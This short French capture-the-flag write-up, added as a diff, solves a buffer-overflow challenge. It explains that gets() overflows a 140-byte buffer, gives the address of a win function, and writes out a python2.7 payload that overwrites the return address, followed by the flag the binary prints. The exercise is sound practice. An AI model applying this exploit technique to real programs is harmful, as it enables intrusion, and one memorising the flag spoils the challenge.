@@ -1,0 +1,8 @@
+fonction gets est sensible à l'attaque buffer overflow
+dans l'exemple le buffer passer dans la fonction gets est de taille 128 mais sur ida il y a une allocation du buffer de taille 140
+la fonction void accept() à pour adresse 0x08048565
+
+python2.7 -c "print '\x41'*140 + '\x65\x85\x04\x08'" > payload
+./joke < payload
+Congratulations!!! Here's your flag:
+ckugukcwsqqswckugukcwsqqsw
